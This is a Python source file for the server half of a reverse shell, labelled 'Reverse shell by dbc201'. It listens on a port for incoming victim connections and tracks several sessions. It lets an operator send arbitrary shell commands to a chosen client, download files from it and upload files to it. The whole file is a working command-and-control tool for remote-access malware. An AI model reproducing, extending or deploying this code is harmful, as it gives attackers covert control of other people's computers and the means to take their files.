import socket
import threading
from queue import Queue
import shlex
import sys, argparse
from Socket import Socket
import os


class Server(Socket):
    def __init__(self, port):
        super().__init__('', port, 4096)
        self.accepted = []
        self.threads = Queue()
        self.lock = threading.Lock()
        self.receiving_file = None

    def run(self):
        self.sock = socket.socket()
        self.sock.bind(('', self.port))
        self.sock.listen(5)  # will end connection after 5 bad attempts
        print("Listening to port:", self.port)
        listening_thread = threading.Thread(target=self.__listen, daemon=True)
        ui_thread = threading.Thread(target=self.__ui, daemon=True)

        self.threads.put(listening_thread)
        self.threads.put(ui_thread)

        listening_thread.start()
        ui_thread.start()

        self.threads.join()

    def kill_threads(self):  # kills the jobs in order to quit
        while not self.threads.empty():
            self.threads.get()
            self.threads.task_done()

    def __listen(self):
        while True:
            accept = self.sock.accept()  # a list of tuples (conn, address)
            print()
            print("Received connection from: " + str(accept[1][0]) + ":" + str(accept[1][1]))
            print("->", end='')
            self.lock.acquire()
            self.accepted.append(accept)
            self.lock.release()

    def update_clients(self):
        clients = "Current connections\n"
        accepted = []
        for i, accept in enumerate(self.accepted):
            try:
                accept[0].sendall(b' ')
                accepted.append(accept)
            except:
                continue
            clients += str(i) + ": " + str(accept[1][0]) + ":" + str(accept[1][1]) + '\n'
        self.lock.acquire()
        self.accepted = accepted
        self.lock.release()
        return clients

    def pipe(self, conn, request_handler, response_handler):
        self.source(conn, request_handler)
        self.sink(conn, response_handler)

    def handle_file(self, data):
        flag = ("SENDING_FILE:" + self.receiving_file).encode()
        if data[:len(flag)] == flag:
            return
        if not os.path.exists("received_files"):
            os.mkdir("received_files")
        with open(os.path.join(os.getcwd(), "received_files", self.receiving_file), "ab") as file:
            file.write(data)

    def communicate(self, conn):
        try:
            print("Type a command")
            while True:
                command = input("->").strip()
                if command.lower() == "exit":
                    return
                if len(command) > 0:
                    command_args = shlex.split(command)
                    if command_args[0] == "send":
                        self.pipe(conn, self.yield_file(os.path.join(os.getcwd(), "send", command_args[1])),
                                  lambda response: print(response.decode("utf-8"), end=''))
                    elif command_args[0] == "receive":
                        self.receiving_file = command_args[1]
                        self.pipe(conn, self.yield_data(command),
                                  self.handle_file)
                        self.receiving_file = None
                    else:
                        self.pipe(conn, self.yield_data(command),
                                  lambda response: print(response.decode("utf-8"), end=''))
        except Exception as e:
            print(e)
            print("Failed to send command!")
            self.update_clients()

    def __ui(self):
        print("Reverse shell by dbc201")
        print("Type help for further info")
        while True:
            connect = input("->").strip()
            if connect.lower() == "exit":
                self.kill_threads()
                self.sock.close()
                return
            elif connect.lower() == "help":
                print("Type list to view active connections")
                print("------------------------------------------------------------------")
                print("Type the number of the client to connect")
                print("------------------------------------------------------------------")
                print("Type receive and name of the files to receive files from client")
                print("Files must be in the current directory")
                print("------------------------------------------------------------------")
                print("Type send to send files, you must create a folder called send")
                print("and put the files there")
                print("------------------------------------------------------------------")
                print("Type exit to exit")
            elif connect.lower() == "list":
                print(self.update_clients())
            else:
                try:
                    conn = self.accepted[int(connect)][0]
                    self.communicate(conn)
                except:
                    print("Failed to connect to client!")


def return_parser():
    parser = argparse.ArgumentParser(description="Reverse shell server made by dbc201")
    parser.add_argument("-p", "--port", type=int, dest="port", help="Port the server will connect to")
    return parser


if __name__ == "__main__":
    parser = return_parser()
    args = parser.parse_args(sys.argv[1:])
    port = 41369
    if args.port:
        port = args.port
    server = Server(port)
    server.run()
